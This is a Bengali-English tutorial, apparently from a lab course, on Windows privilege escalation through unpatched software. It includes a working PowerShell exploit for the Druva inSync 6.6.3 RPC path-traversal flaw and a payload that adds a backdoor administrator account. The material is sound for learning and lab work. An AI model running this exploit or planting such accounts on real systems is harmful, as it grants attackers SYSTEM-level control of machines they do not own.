## Unpatched Software

Target system-এ installed software পুরোনো বা unpatched হলে privilege escalation-এর সুযোগ তৈরি হতে পারে। অনেক সময় OS update করা হলেও installed software update করা হয় না।

Installed software ও version দেখতে:

```
wmic product get name,version,vendor
```

Command শেষ হতে প্রায় ১ মিনিট লাগতে পারে।

মনে রাখবে: `wmic product` সব installed program দেখায় না। Software কীভাবে install করা হয়েছে তার ওপর নির্ভর করে কিছু program বাদ পড়তে পারে। তাই এগুলোও check করতে হবে:

- Desktop shortcuts
- Available services
- Software-এর অন্য কোনো trace

Version পাওয়ার পর known exploit খুঁজতে পারো:

- [Exploit-DB](https://www.exploit-db.com/?utm_source=chatgpt.com)
- [Packet Storm](https://packetstormsecurity.com/?utm_source=chatgpt.com)
- [Google](https://www.google.com/?utm_source=chatgpt.com)

Task: `wmic` ও Google ব্যবহার করে installed কোনো product-এর known vulnerability খুঁজে বের করো।

## Case Study: Druva inSync 6.6.3

Privilege Escalation Vulnerability

Druva inSync 6.6.3-এ privilege escalation vulnerability রয়েছে।

- Researcher: [Matteo Malvica](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/?utm_source=chatgpt.com)
- আগের vulnerability (version 6.5.0): [Chris Lyne](https://www.tenable.com/security/research/tra-2020-12?utm_source=chatgpt.com)

### Vulnerability কীভাবে কাজ করে?

- Druva inSync localhost-এর port `6064`-এ RPC server চালায়।
- RPC server `SYSTEM` privilege-এ চলে।
- RPC-এর procedure number `5` দিয়ে যেকোনো command execute করা সম্ভব ছিল।
- আগের vulnerability-তে কোনো command restriction ছিল না।

Patch দেওয়ার পরও সমস্যা:

Patch-এ check করা হয় command path নিচের string দিয়ে শুরু হয়েছে কি না:

```
C:\ProgramData\Druva\inSync4\
```

কিন্তু Path Traversal ব্যবহার করে এই check bypass করা যায়।

যেমন, `cmd.exe` চালানোর জন্য:

```
C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe
```

এভাবে allowed directory থেকে বের হয়ে অন্য executable চালানো সম্ভব।

### Exploit Protocol

Port `6064`-এর সঙ্গে যোগাযোগ করতে ৪টি packet পাঠাতে হয়:

1. Hello packet: Fixed string পাঠায়।
2. RPC type: Vulnerable procedure number `5` নির্বাচন করে।
3. Length: Command-এর length পাঠায়।
4. Command: Execute করার command পাঠায়।

Diagram: [Druva Exploit Diagram](https://cdn-images.tryhackme.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ff706d6530426d3123c0983acd61f934.png?utm_source=chatgpt.com)

Original exploit: [Packet Storm](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html?utm_source=chatgpt.com)

### Exploit Code

PowerShell exploit:

```
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

PowerShell console-এ code paste করে চালানো যাবে। Exploit file-টিও এখানে আছে:

```
C:\tools\Druva_inSync_exploit.txt
```

Default payload:

```
net user pwnd /add
```

এটি `pwnd` user তৈরি করে, কিন্তু Administrator privilege দেয় না।

### Administrator User তৈরি

`$cmd` variable পরিবর্তন করে নিচের command ব্যবহার করতে হবে:

```
net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
```

এতে:

- Username: `pwnd`
- Password: `SimplePass123`
- Group: `Administrators`

User ও group membership verify:

```
net user pwnd
```

Output:

```
PS C:\> net user pwnd
User name                    pwnd
Full Name
Account active               Yes
[...]

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
```

Short recap:

- `wmic product get name,version,vendor` → Installed software ও version খোঁজা।
- Unpatched software → Privilege escalation-এর সম্ভাবনা।
- Druva inSync 6.6.3 → RPC port `6064`, procedure `5`।
- Path Traversal → Patch bypass।
- RPC server `SYSTEM` privilege-এ চলে → Command-ও SYSTEM privilege-এ execute হয়।
